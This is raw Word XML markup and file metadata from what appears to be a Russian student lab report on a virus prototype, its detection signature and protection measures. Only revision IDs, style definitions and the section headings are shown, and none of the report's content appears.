    <w:rsid w:val="00682CB2"/>
    <w:rsid w:val="006830F5"/>
    <w:rsid w:val="006B3E75"/>
    <w:rsid w:val="006B44AB"/>
    <w:rsid w:val="006C7A54"/>
    <w:rsid w:val="006E5964"/>
    <w:rsid w:val="006E7B40"/>
    <w:rsid w:val="006F5F48"/>
    <w:rsid w:val="00710F7E"/>
    <w:rsid w:val="0071183B"/>
    <w:rsid w:val="00712EFB"/>
    <w:rsid w:val="007246FB"/>
    <w:rsid w:val="00735118"/>
    <w:rsid w:val="0074227F"/>
    <w:rsid w:val="007528C5"/>
    <w:rsid w:val="007634CF"/>
    <w:rsid w:val="0078465D"/>
    <w:rsid w:val="007932A8"/>
    <w:rsid w:val="007C378E"/>
    <w:rsid w:val="007D0609"/>
    <w:rsid w:val="007E223D"/>
    <w:rsid w:val="007E65B7"/>
    <w:rsid w:val="007F0273"/>
    <w:rsid w:val="00803E9D"/>
    <w:rsid w:val="008045D8"/>
    <w:rsid w:val="008244CC"/>
    <w:rsid w:val="008302C7"/>
    <w:rsid w:val="00830F2D"/>
    <w:rsid w:val="008434BB"/>
    <w:rsid w:val="00851198"/>
    <w:rsid w:val="00852090"/>
    <w:rsid w:val="00853432"/>
    <w:rsid w:val="00856000"/>
    <w:rsid w:val="008674D7"/>
    <w:rsid w:val="008C67BD"/>
    <w:rsid w:val="008D5EA0"/>
    <w:rsid w:val="008F1AD6"/>
    <w:rsid w:val="00903505"/>
    <w:rsid w:val="00917645"/>
    <w:rsid w:val="00917D90"/>
    <w:rsid w:val="00933E0A"/>
    <w:rsid w:val="0093477C"/>
    <w:rsid w:val="0094040A"/>
    <w:rsid w:val="00941061"/>
    <w:rsid w:val="00942D27"/>
    <w:rsid w:val="00965B97"/>
    <w:rsid w:val="00966B0F"/>
    <w:rsid w:val="00971E07"/>
    <w:rsid w:val="00984831"/>
    <w:rsid w:val="00985035"/>
    <w:rsid w:val="009A77CB"/>
    <w:rsid w:val="009B1702"/>
    <w:rsid w:val="009C0BE6"/>
    <w:rsid w:val="009C0CF1"/>
    <w:rsid w:val="009C15C0"/>
    <w:rsid w:val="009C6922"/>
    <w:rsid w:val="009D3CCE"/>
    <w:rsid w:val="009E6813"/>
    <w:rsid w:val="009F270C"/>
    <w:rsid w:val="009F5065"/>
    <w:rsid w:val="00A04644"/>
    <w:rsid w:val="00A105DF"/>
    <w:rsid w:val="00A20BE4"/>
    <w:rsid w:val="00A20E1C"/>
    <w:rsid w:val="00A2111C"/>
    <w:rsid w:val="00A233A8"/>
    <w:rsid w:val="00A430E2"/>
    <w:rsid w:val="00A62693"/>
    <w:rsid w:val="00A64183"/>
    <w:rsid w:val="00A64D35"/>
    <w:rsid w:val="00A745CB"/>
    <w:rsid w:val="00A9283B"/>
    <w:rsid w:val="00AC748B"/>
    <w:rsid w:val="00AD03E2"/>
    <w:rsid w:val="00AD39F7"/>
    <w:rsid w:val="00AE243B"/>
    <w:rsid w:val="00AE53D9"/>
    <w:rsid w:val="00B03DF5"/>
    <w:rsid w:val="00B133A9"/>
    <w:rsid w:val="00B13B4B"/>
    <w:rsid w:val="00B20597"/>
    <w:rsid w:val="00B26C8E"/>
    <w:rsid w:val="00B53CBD"/>
    <w:rsid w:val="00B5436E"/>
    <w:rsid w:val="00B57E08"/>
    <w:rsid w:val="00B968FE"/>
    <w:rsid w:val="00BA148B"/>
    <w:rsid w:val="00BA3118"/>
    <w:rsid w:val="00BC4C46"/>
    <w:rsid w:val="00BE19C9"/>
    <w:rsid w:val="00BE1C48"/>
    <w:rsid w:val="00BE3A28"/>
    <w:rsid w:val="00BE490B"/>
    <w:rsid w:val="00C1681C"/>
    <w:rsid w:val="00C174D6"/>
    <w:rsid w:val="00C36F05"/>
    <w:rsid w:val="00C469D8"/>
    <w:rsid w:val="00C5031D"/>
    <w:rsid w:val="00C53ADA"/>
    <w:rsid w:val="00C732D9"/>
    <w:rsid w:val="00C76798"/>
    <w:rsid w:val="00C77E41"/>
    <w:rsid w:val="00C85B53"/>
    <w:rsid w:val="00C909DE"/>
    <w:rsid w:val="00CC5C41"/>
    <w:rsid w:val="00CD47C7"/>
    <w:rsid w:val="00CF315C"/>
    <w:rsid w:val="00D139C3"/>
    <w:rsid w:val="00D32446"/>
    <w:rsid w:val="00D342F1"/>
    <w:rsid w:val="00D5217D"/>
    <w:rsid w:val="00D53D81"/>
    <w:rsid w:val="00D60F71"/>
    <w:rsid w:val="00D71858"/>
    <w:rsid w:val="00D86368"/>
    <w:rsid w:val="00D86D38"/>
    <w:rsid w:val="00D926B3"/>
    <w:rsid w:val="00DB41D3"/>
    <w:rsid w:val="00DB66C1"/>
    <w:rsid w:val="00DF5ACB"/>
    <w:rsid w:val="00DF7EE9"/>
    <w:rsid w:val="00E02DCD"/>
    <w:rsid w:val="00E14A23"/>
    <w:rsid w:val="00E34A15"/>
    <w:rsid w:val="00E52A87"/>
    <w:rsid w:val="00E66BDC"/>
    <w:rsid w:val="00E675B9"/>
    <w:rsid w:val="00E802CE"/>
    <w:rsid w:val="00E80FFE"/>
    <w:rsid w:val="00EA504A"/>
    <w:rsid w:val="00EC03D0"/>
    <w:rsid w:val="00EF2109"/>
    <w:rsid w:val="00EF4ADA"/>
    <w:rsid w:val="00F03722"/>
    <w:rsid w:val="00F2105D"/>
    <w:rsid w:val="00F47541"/>
    <w:rsid w:val="00F52229"/>
    <w:rsid w:val="00F52F00"/>
    <w:rsid w:val="00F56C63"/>
    <w:rsid w:val="00F570B7"/>
    <w:rsid w:val="00F67AC2"/>
    <w:rsid w:val="00F72384"/>
    <w:rsid w:val="00F72418"/>
    <w:rsid w:val="00F72D85"/>
    <w:rsid w:val="00F7377D"/>
    <w:rsid w:val="00F74364"/>
    <w:rsid w:val="00F91A1E"/>
    <w:rsid w:val="00F92FA9"/>
    <w:rsid w:val="00FB5D42"/>
    <w:rsid w:val="00FC19FE"/>
    <w:rsid w:val="00FD22B1"/>
    <w:rsid w:val="00FD498F"/>
    <w:rsid w:val="00FE7258"/>
    <w:rsid w:val="00FF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0C37F9"/>
  <w15:docId w15:val="{EEED1785-4695-442F-A914-733165DB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A64D35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A64D35"/>
    <w:pPr>
      <w:numPr>
        <w:numId w:val="10"/>
      </w:numPr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qFormat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a">
    <w:name w:val="Emphasis"/>
    <w:basedOn w:val="a5"/>
    <w:uiPriority w:val="20"/>
    <w:qFormat/>
    <w:locked/>
    <w:rsid w:val="0045798B"/>
    <w:rPr>
      <w:i/>
      <w:iCs/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="HTML">
    <w:name w:val="HTML Code"/>
    <w:basedOn w:val="a5"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:locked/>
    <w:rsid w:val="0045798B"/>
    <w:rPr>
      <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Courier New"/>
      <w:sz w:val="20"/>
      <w:szCs w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="character" w:styleId="affb">
    <w:name w:val="Unresolved Mention"/>
    <w:basedOn w:val="a5"/>
    <w:uiPriority w:val="99"/>
    <w:semiHidden/>
    <w:unhideWhenUsed/>
    <w:rsid w:val="0045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v.3_&#1064;&#1072;&#1073;&#1083;&#1086;&#1085;_&#1043;&#1054;&#1057;&#1058;_7.3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CC68C-A4F6-4075-9DBD-A43DC95A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v.3_Шаблон_ГОСТ_7.32.dotx</Template>
  <TotalTime>1513</TotalTime>
  <Pages>9</Pages>
  <Words>693</Words>
  <Characters>3951</Characters>
  <Application>Microsoft Office Word</Application>
  <DocSecurity>0</DocSecurity>
  <Lines>32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  <vt:variant>
        <vt:lpstr>Title</vt:lpstr>
      </vt:variant>
      <vt:variant>
        <vt:i4>1</vt:i4>
      </vt:variant>
    </vt:vector>
  </HeadingPairs>
  <TitlesOfParts>
    <vt:vector size="10" baseType="lpstr">
      <vt:lpstr/>
      <vt:lpstr>Формулировка задания</vt:lpstr>
      <vt:lpstr>Основная часть</vt:lpstr>
      <vt:lpstr>    Блок-схема алгоритма вируса</vt:lpstr>
      <vt:lpstr>    Реализация прототипа вируса</vt:lpstr>
      <vt:lpstr>    Сигнатура для обнаружения вируса</vt:lpstr>
      <vt:lpstr>    Вариант защиты (без антивируса)</vt:lpstr>
      <vt:lpstr>Выводы</vt:lpstr>
      <vt:lpstr>ПРИЛОЖЕНИЕ А</vt:lpstr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 Lavrova</dc:creator>
  <cp:lastModifiedBy>Черникова Василиса Михайловна</cp:lastModifiedBy>
  <cp:revision>80</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2020-03-24T09:27:00Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-11-30T21:55:00Z</dcterms:modified>
</cp:coreProperties>
</file>